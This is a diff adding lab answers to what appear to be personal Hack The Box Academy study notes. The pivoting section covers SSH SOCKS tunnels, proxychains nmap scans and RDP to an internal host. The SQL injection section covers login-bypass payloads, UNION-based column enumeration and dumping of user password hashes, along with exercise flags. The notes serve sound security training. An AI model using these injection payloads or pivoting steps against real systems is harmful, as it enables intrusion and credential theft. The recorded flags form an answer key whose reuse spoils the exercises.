@@ -2633,6 +2633,149 @@ Results: `HTB{46u$!n9_l!nk3d_$3rv3r$}`
 
 ## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)
 
+### Introduction
+
+**Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?**
+
+Results: eth0
+
+
+**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?**
+
+Results: tun0
+
+
+**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?**
+
+Results: 178.62.64.1
+
+
+
+### Choosing The Dig Site & Starting Our Tunnels
+
+SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
+You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)
+
+```
+ssh ubuntu@$ip -D 1234
+ip a
+```
+
+Results: 3
+
+Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.
+
+```
+# Configure proxychains.
+sudo nano /etc/proxychains4.conf
+# Adding the last line: socks5 127.0.0.1 1234
+
+# Set the dynamic port:
+ssh ubuntu@$ip -D 1234 
+# Scan the NIC in the connection
+ip a
+
+# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
+proxychains nmap -v -sT -Pn 172.16.5.1-255
+
+# In the results you will see 172.16.5.19. Now run a nmap on that ip
+proxychains nmap -v -sT -Pn 172.16.5.19
+# Open ports: 
+# 53/tcp   open  domain
+# 80/tcp   open  http
+# 88/tcp   open  kerberos-sec
+# 135/tcp  open  msrpc
+# 139/tcp  open  netbios-ssn
+# 389/tcp  open  ldap
+# 445/tcp  open  microsoft-ds
+# 464/tcp  open  kpasswd5
+# 593/tcp  open  http-rpc-epmap
+# 636/tcp  open  ldapssl
+# 3268/tcp open  globalcatLDAP
+# 3269/tcp open  globalcatLDAPssl
+# 3389/tcp open  ms-wbt-server
+
+# In a different terminal
+export user="victor"
+export pass="pass@123" 
+proxychains xfreerdp  /u:$user /p:$pass /v:172.16.5.19
+# And you will get a RDP connection. Open the flag.txt
+```
+
+Results: N1c3Piv0t
+
+**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"**
+**Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**
+
+```
+# Configure proxychains.
+sudo nano /etc/proxychains4.conf
+# Adding the last line: socks5 127.0.0.1 1234
+
+# Set the dynamic port:
+ssh ubuntu@$ip -D 1234 
+# Scan the NIC in the connection
+ip a
+```
+
+Results: 172.16.5.129
+
+**What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**
+
+Results: 0.0.0.0
+
+
+**What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**
+
+```
+# Configure proxychains.
+sudo nano /etc/proxychains4.conf
+# Adding the last line: socks5 127.0.0.1 1234
+
+# Set the dynamic port:
+ssh ubuntu@$ip -D 1234 
+# Scan the NIC in the connection
+ip a
+
+# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
+proxychains nmap -v -sT -Pn 172.16.5.1-255
+
+# In the results you will see 172.16.5.19. Now run a nmap on that ip
+# Open ports: 
+# 53/tcp   open  domain
+# 80/tcp   open  http
+# 88/tcp   open  kerberos-sec
+# 135/tcp  open  msrpc
+# 139/tcp  open  netbios-ssn
+# 389/tcp  open  ldap
+# 445/tcp  open  microsoft-ds
+# 464/tcp  open  kpasswd5
+# 593/tcp  open  http-rpc-epmap
+# 636/tcp  open  ldapssl
+# 3268/tcp open  globalcatLDAP
+# 3269/tcp open  globalcatLDAPssl
+# 3389/tcp open  ms-wbt-server
+
+```
+
+Results: 172.16.5.19,172.16.5.129
+
+**Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**
+
+Results: 172.16.5.0/255.255.254.0 via 10.129.202.64
+
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+
 ## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
@@ -3105,13 +3248,87 @@ Results: 654
 
 ### SQL Injections
 
-Question
+**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**
+
+```
+# Username
+tom' OR '1'='1
+
+# Password
+lala
+```
+
+Results:  202a1d1a8b195d5e9a57e434cc16000c
+
+
+**Login as the user with the id 5 to get the flag.**
+
+```
+# Username
+' or id=5)#
+# Leave password empty
+```
+
+Results:  cdad9ecdf6f14b45ff5c4de32909caec
+
+Authenticate to `$ip:$port` with user "root" and password "password". Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
+
+```
+mysql -u root -h $ip -P $port -ppassword
+
+show databases;
+use employees;
+describe employees;
+describe departments;
+SELECT dept_no,dept_name,NULL,NULL,NULL,NULL from departments UNION select * FROM employees;
+```
+
+Results: 663
+
+
+**Use a Union injection to get the result of 'user()'**
+
+```
+' ORDER BY 1;#
+' ORDER BY 2;#
+' ORDER BY 3;#
+' ORDER BY 4;#
+' ORDER BY 5;#
+
+# With 5 columns it will return an error, so it has 4 columns
+
+# Check out which ones are printed with
+' UNION select 1,2,3,4;#
+
+# The UI will give you columns 2,3,4. Inject the code there
+' UNION select 1,user(),@@version,4;#
 
 ```
 
+Results: root@localhost
+
+### Exploitation
+
+**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**
+
+```
+# This comes from the previous exercise...
+
+# Get all the columns from the table users
+cn' UNION select 1,column_name,3,4 from information_schema.columns WHERE table_name='users'-- -
+
+# Get id, username and password from table users:
+cn' UNION select 1,id,username,password from users-- -
 ```
 
-Results: 
+| **Port Code** |     |     | **Port City** |     |     | **Port Volume**                  |     |     |
+| ------------- | --- | --- | ------------- | --- | --- | -------------------------------- | --- | --- |
+| 1             |     |     | admin         |     |     | 392037dbba51f692776d6cefb6dd546d |     |     |
+| 2             |     |     | newuser       |     |     | 9da2c9bcdf39d8610954e0e11ea8f45f |     |     |
+
+Results:  9da2c9bcdf39d8610954e0e11ea8f45f
+
+
 
 
 
